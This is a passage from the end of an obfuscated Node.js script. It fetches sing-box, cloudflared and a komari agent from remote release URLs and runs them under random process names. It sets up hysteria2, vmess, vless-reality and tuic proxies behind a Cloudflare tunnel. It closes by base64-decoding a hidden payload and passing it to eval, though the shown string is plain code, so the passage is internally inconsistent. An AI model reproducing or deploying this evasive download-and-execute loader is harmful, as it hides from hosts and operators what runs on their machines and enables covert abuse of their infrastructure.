_0x337197=_0x284ded;_0x23076f!==0x0&&(serviceStatus[_0x337197(0x1c0)]='stopped');}),setTimeout(()=>{const _0x1fd88=_0x284ded;try{const _0x1df9e0=fs[_0x1fd88(0x163)](_0x10301c,'utf8'),_0x3bc889=_0x1df9e0[_0x1fd88(0x201)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x3bc889){CONFIG[_0x1fd88(0x1a4)]=_0x3bc889[0x1];try{fs[_0x1fd88(0x17d)](_0x10301c);}catch(_0x28ea32){}return _0x58df5a(!![]);}}catch(_0x45e402){}_0x4fcb25[_0x1fd88(0x217)]();try{fs[_0x1fd88(0x17d)](_0x10301c);}catch(_0x9188b6){}_0xeb5f97===0x2&&(serviceStatus[_0x1fd88(0x1c0)]=_0x1fd88(0x19e),_0x58df5a(![]));},0x2710);}});}async function generateRealityKeys(_0x3f34ca){const _0x345e03=_0x88c72f;if(!CONFIG[_0x345e03(0x160)]||CONFIG[_0x345e03(0x1e3)]&&CONFIG[_0x345e03(0x1fa)])return;return new Promise(_0x5909c1=>{const _0x25be4a=_0x345e03;exec('\x22'+_0x3f34ca+_0x25be4a(0x1f0),(_0x5c77b9,_0x521a40)=>{const _0x51500a=_0x25be4a;if(!_0x5c77b9&&_0x521a40){const _0x370271=_0x521a40['match'](/PrivateKey:\s*(\S+)/),_0x319bad=_0x521a40[_0x51500a(0x201)](/PublicKey:\s*(\S+)/);_0x370271&&_0x319bad&&(CONFIG[_0x51500a(0x1e3)]=_0x370271[0x1],CONFIG[_0x51500a(0x1fa)]=_0x319bad[0x1]);}_0x5909c1();});});}async function generateSingBoxConfig(){const _0x2034b8=_0x88c72f,_0x27e6dc=[];CONFIG['HY2_PORT']&&_0x27e6dc[_0x2034b8(0x221)]({'type':'hysteria2','tag':_0x2034b8(0x20e),'listen':_0x2034b8(0x1d1),'listen_port':parseInt(CONFIG['HY2_PORT']),'users':[{'password':CONFIG[_0x2034b8(0x18a)]}],'tls':{'enabled':!![],'server_name':CONFIG[_0x2034b8(0x191)],'insecure':!![],'alpn':['h3']}});CONFIG[_0x2034b8(0x1e4)]&&_0x27e6dc[_0x2034b8(0x221)]({'type':_0x2034b8(0x1d4),'tag':_0x2034b8(0x214),'listen':_0x2034b8(0x1d1),'listen_port':parseInt(CONFIG[_0x2034b8(0x1e4)]),'users':[{'uuid':CONFIG[_0x2034b8(0x22b)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x2034b8(0x200)],'headers':{}}});CONFIG[_0x2034b8(0x160)]&&_0x27e6dc[_0x2034b8(0x221)]({'type':'vless','tag':'reality-in','listen':'0.0.0.0','listen_port':parseInt(CONFIG[_0x2034b8(0x160)]),'users':[{'uuid':CONFIG[_0x2034b8(0x22b)],'flow':_0x2034b8(0x1ba)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x2034b8(0x21a)],'reality':{'enabled':!![],'handshake':{'server':CONFIG['REALITY_SNI'],'server_port':0x1bb},'private_key':CONFIG[_0x2034b8(0x1e3)],'short_id':[CONFIG[_0x2034b8(0x1a7)]]}}});CONFIG[_0x2034b8(0x1cb)]&&_0x27e6dc[_0x2034b8(0x221)]({'type':_0x2034b8(0x216),'tag':_0x2034b8(0x1a1),'listen':_0x2034b8(0x1d1),'listen_port':parseInt(CONFIG[_0x2034b8(0x1cb)]),'users':[{'uuid':CONFIG['TUIC_UUID'],'password':CONFIG[_0x2034b8(0x1e8)]}],'congestion_control':_0x2034b8(0x17b),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x2034b8(0x194),'tls':{'enabled':!![],'server_name':CONFIG[_0x2034b8(0x191)],'insecure':!![],'alpn':['h3']}});const _0x10130f={'log':{'level':'warn','timestamp':!![]},'dns':{'servers':[{'tag':_0x2034b8(0x1ed),'address':'8.8.8.8'},{'tag':'cloudflare','address':_0x2034b8(0x220)}],'final':'google'},'inbounds':_0x27e6dc,'outbounds':[{'type':_0x2034b8(0x223),'tag':_0x2034b8(0x223)},{'type':_0x2034b8(0x1a0),'tag':_0x2034b8(0x1a0)}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x2034b8(0x223)}],'final':'direct'},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x2034b8(0x1bb)](WORK_DIR,_0x2034b8(0x15f))}}},_0x275409=path[_0x2034b8(0x1bb)](WORK_DIR,_0x2034b8(0x1ec));return fs[_0x2034b8(0x197)](_0x275409,JSON[_0x2034b8(0x20d)](_0x10130f,null,0x2)),_0x275409;}function generateLinks(_0x5958f1){const _0x261212=_0x88c72f,_0x3b9985=[];CONFIG[_0x261212(0x1ee)]&&_0x3b9985[_0x261212(0x221)]({'protocol':_0x261212(0x175),'url':_0x261212(0x20c)+CONFIG['HY2_PASSWORD']+'@'+_0x5958f1+':'+CONFIG[_0x261212(0x1ee)]+_0x261212(0x21f)+CONFIG[_0x261212(0x191)]+'&alpn=h3#HY2'});if(CONFIG[_0x261212(0x1e4)]){const _0x56bf24={'v':'2','ps':_0x261212(0x15c),'add':CONFIG[_0x261212(0x1b4)],'port':_0x261212(0x202),'id':CONFIG[_0x261212(0x22b)],'aid':'0','scy':'auto','net':'ws','type':_0x261212(0x162),'host':CONFIG['C_D'],'path':CONFIG[_0x261212(0x200)],'tls':_0x261212(0x169),'sni':CONFIG['C_D'],'alpn':'','fp':'chrome'};_0x3b9985[_0x261212(0x221)]({'protocol':_0x261212(0x1bd),'url':_0x261212(0x1e0)+Buffer['from'](JSON[_0x261212(0x20d)](_0x56bf24))[_0x261212(0x1df)]('base64')});}return CONFIG[_0x261212(0x160)]&&_0x3b9985[_0x261212(0x221)]({'protocol':_0x261212(0x1c5),'url':_0x261212(0x1ac)+CONFIG['VMESS_UUID']+'@'+_0x5958f1+':'+CONFIG[_0x261212(0x160)]+_0x261212(0x211)+CONFIG[_0x261212(0x21a)]+'&fp=chrome&pbk='+CONFIG['REALITY_PUBLIC_KEY']+'&sid='+CONFIG[_0x261212(0x1a7)]+'&type=tcp#REALITY'}),CONFIG['TUIC_PORT']&&_0x3b9985['push']({'protocol':'TUIC','url':_0x261212(0x226)+CONFIG[_0x261212(0x1b1)]+':'+CONFIG['TUIC_PASSWORD']+'@'+_0x5958f1+':'+CONFIG[_0x261212(0x1cb)]+_0x261212(0x188)}),_0x3b9985;}function cleanup(){const _0x59bc43=_0x88c72f;processes[_0x59bc43(0x1a8)](_0xcf7b3a=>{try{_0xcf7b3a['kill']();}catch(_0x1206d2){}}),process[_0x59bc43(0x1e6)](0x0);}async function startService(_0x2d2aa6,_0x45b5a1,_0x4267d0,_0x518840={}){const _0x11000d=_0x88c72f;try{const _0x74dccc=spawn(_0x2d2aa6,_0x45b5a1,{'stdio':['ignore',_0x11000d(0x1a3),_0x11000d(0x1a3)],..._0x518840});if(_0x518840[_0x11000d(0x1de)]){const _0x4c5bc6=fs[_0x11000d(0x1c9)](_0x518840['logFile']);_0x74dccc[_0x11000d(0x19a)]['pipe'](_0x4c5bc6),_0x74dccc['stderr'][_0x11000d(0x1a3)](_0x4c5bc6);}return serviceStatus[_0x4267d0[_0x11000d(0x208)]()]=_0x11000d(0x15d),_0x74dccc['on'](_0x11000d(0x19f),()=>{const _0x559267=_0x11000d;serviceStatus[_0x4267d0[_0x559267(0x208)]()]=_0x559267(0x15d);}),_0x74dccc['on'](_0x11000d(0x19e),()=>{const _0x4ac718=_0x11000d;serviceStatus[_0x4267d0['toLowerCase']()]=_0x4ac718(0x19e);}),_0x74dccc['on']('exit',()=>{const _0x45c7cc=_0x11000d;serviceStatus[_0x4267d0[_0x45c7cc(0x208)]()]=_0x45c7cc(0x1d6);}),new Promise(_0x1dce4d=>{const _0x4501df=()=>{const _0x19b69d=_0x3689;_0x74dccc['killed']?(serviceStatus[_0x4267d0[_0x19b69d(0x208)]()]=_0x19b69d(0x1d6),_0x1dce4d(null)):(processes[_0x19b69d(0x221)](_0x74dccc),_0x1dce4d(_0x74dccc));};setTimeout(_0x4501df,0x7d0);});}catch(_0x204a61){return serviceStatus[_0x4267d0[_0x11000d(0x208)]()]='error',null;}}const app=express();app[_0x88c72f(0x16b)]('/',(_0x563be7,_0x221bad)=>{const _0x3d1813=_0x88c72f;_0x221bad['writeHead'](0xc8,{'Content-Type':_0x3d1813(0x1f3)}),_0x221bad[_0x3d1813(0x1c6)](HTML_TEMPLATES[_0x3d1813(0x183)]);}),app['get'](_0x88c72f(0x1f6),async(_0x340ab0,_0x28dd1b)=>{const _0x8a93ed=_0x88c72f,_0x3a63e0=await getServerIP(),_0x5ce692=generateLinks(_0x3a63e0);_0x28dd1b[_0x8a93ed(0x1b0)](0xc8,{'Content-Type':_0x8a93ed(0x1f3)}),_0x28dd1b['end'](HTML_TEMPLATES[_0x8a93ed(0x1d7)](_0x3a63e0,_0x5ce692));}),app[_0x88c72f(0x16b)]('/x',async(_0x3def39,_0xc00613)=>{const _0x13f148=_0x88c72f,_0x10b135=await getServerIP(),_0x5ce819=generateLinks(_0x10b135);_0xc00613[_0x13f148(0x1b0)](0xc8,{'Content-Type':_0x13f148(0x1f3)}),_0xc00613[_0x13f148(0x1c6)](HTML_TEMPLATES[_0x13f148(0x1d7)](_0x10b135,_0x5ce819));}),app[_0x88c72f(0x16b)](_0x88c72f(0x1e9),(_0x17e3e1,_0x5556c2)=>{const _0x33aea8=_0x88c72f;_0x5556c2[_0x33aea8(0x1b0)](0xc8,{'Content-Type':_0x33aea8(0x1d8)}),_0x5556c2[_0x33aea8(0x1c6)](JSON[_0x33aea8(0x20d)]({'status':'ok','uptime':process[_0x33aea8(0x1d5)]()}));});const server=http[_0x88c72f(0x1da)](app);server['on'](_0x88c72f(0x172),createProxyMiddleware({'target':_0x88c72f(0x209)+CONFIG[_0x88c72f(0x1e4)],'changeOrigin':!![],'ws':!![],'logLevel':_0x88c72f(0x184)}));async function main(){const _0x5c661e=_0x88c72f;server[_0x5c661e(0x20b)](CONFIG[_0x5c661e(0x166)],()=>{const _0x5dcf3c=_0x5c661e;serviceStatus['http']=_0x5dcf3c(0x15d);});try{const _0x5eacff=detectArch(),_0x44cb2d=_0x5eacff==='arm64',_0x57407b=getRandomProcessName(),_0x58afe8=getRandomProcessName(),_0x5d6954=getRandomProcessName(),_0xcae8f8=path[_0x5c661e(0x1bb)](WORK_DIR,_0x57407b),_0x22589e=path['join'](WORK_DIR,_0x58afe8),_0x218b75=path[_0x5c661e(0x1bb)](WORK_DIR,_0x5d6954),_0x24015c={'singbox':_0x44cb2d?'https://github.com/seav1/dl/releases/download/files/sb-arm':_0x5c661e(0x227),'cloudflared':_0x44cb2d?_0x5c661e(0x173):_0x5c661e(0x1b8),'komari':_0x44cb2d?_0x5c661e(0x168):_0x5c661e(0x1db)};await Promise['all']([downloadBinary(_0x24015c[_0x5c661e(0x1c2)],_0xcae8f8),downloadBinary(_0x24015c[_0x5c661e(0x1c0)],_0x22589e),downloadBinary(_0x24015c['komari'],_0x218b75)]),[_0xcae8f8,_0x22589e,_0x218b75][_0x5c661e(0x1a8)](_0x31132f=>{const _0x4bf6f6=_0x5c661e;if(!fs[_0x4bf6f6(0x178)](_0x31132f))throw new Error(_0x4bf6f6(0x219)+_0x31132f);});const _0x506138=await getServerIP();if(CONFIG[_0x5c661e(0x1ee)]||CONFIG[_0x5c661e(0x1e4)]||CONFIG[_0x5c661e(0x160)]||CONFIG[_0x5c661e(0x1cb)]){await generateRealityKeys(_0xcae8f8);const _0x416638=await generateSingBoxConfig();try{await new Promise((_0x517cc0,_0x41f873)=>{const _0x3aab9a=_0x5c661e;exec('\x22'+_0xcae8f8+_0x3aab9a(0x22d)+_0x416638+'\x22',_0x19a453=>{_0x19a453?_0x41f873(_0x19a453):_0x517cc0();});}),await startService(_0xcae8f8,[_0x5c661e(0x16d),'-c',_0x416638],'singbox');}catch(_0x5065e5){serviceStatus[_0x5c661e(0x1c2)]='error';}}if(CONFIG[_0x5c661e(0x195)])try{const _0x43e194=[_0x5c661e(0x199),_0x5c661e(0x177),_0x5c661e(0x17c),_0x5c661e(0x205),_0x5c661e(0x1d0),_0x5c661e(0x1f4),'run',_0x5c661e(0x164),CONFIG[_0x5c661e(0x195)],_0x5c661e(0x1ef),_0x5c661e(0x21c)+CONFIG[_0x5c661e(0x166)]];await startService(_0x22589e,_0x43e194,_0x5c661e(0x1c0));}catch(_0x9b719a){serviceStatus[_0x5c661e(0x1c0)]=_0x5c661e(0x19e);}else{if(CONFIG['VMESS_PORT']){const _0x21519f=await startTempTunnel(_0x22589e,CONFIG[_0x5c661e(0x166)]);!_0x21519f&&(serviceStatus[_0x5c661e(0x1c0)]=_0x5c661e(0x19e));}}if(CONFIG[_0x5c661e(0x204)]&&CONFIG['K_K']){const _0x1c4fd7=['-e',''+CONFIG[_0x5c661e(0x204)],'-t',''+CONFIG['K_K'],_0x5c661e(0x1e2)];try{await startService(_0x218b75,_0x1c4fd7,_0x5c661e(0x1dd),{'logFile':path['join'](WORK_DIR,_0x5c661e(0x180))});}catch(_0x363e85){serviceStatus[_0x5c661e(0x1dd)]='error';}}setInterval(()=>{const _0x312907=_0x5c661e;processes[_0x312907(0x1a8)](_0x4f26b0=>{const _0x97e53=_0x312907;if(_0x4f26b0[_0x97e53(0x1fd)]){const _0x1c51a1=Object[_0x97e53(0x1b3)](serviceStatus)['find'](_0x4ceb5e=>serviceStatus[_0x4ceb5e]===_0x97e53(0x15d)&&!processes[_0x97e53(0x20f)](_0x4734b5=>_0x4734b5!==_0x4f26b0&&!_0x4734b5[_0x97e53(0x1fd)]));_0x1c51a1&&(serviceStatus[_0x1c51a1]='stopped');}}),processes['length']>0x0&&processes[_0x312907(0x203)](_0x41b9aa=>_0x41b9aa[_0x312907(0x1fd)])&&cleanup();},0x2710),process['on'](_0x5c661e(0x1dc),cleanup),process['on'](_0x5c661e(0x19d),cleanup);}catch(_0x96d663){process['exit'](0x1);}}main()[_0x88c72f(0x18d)](()=>process[_0x88c72f(0x1e6)](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);
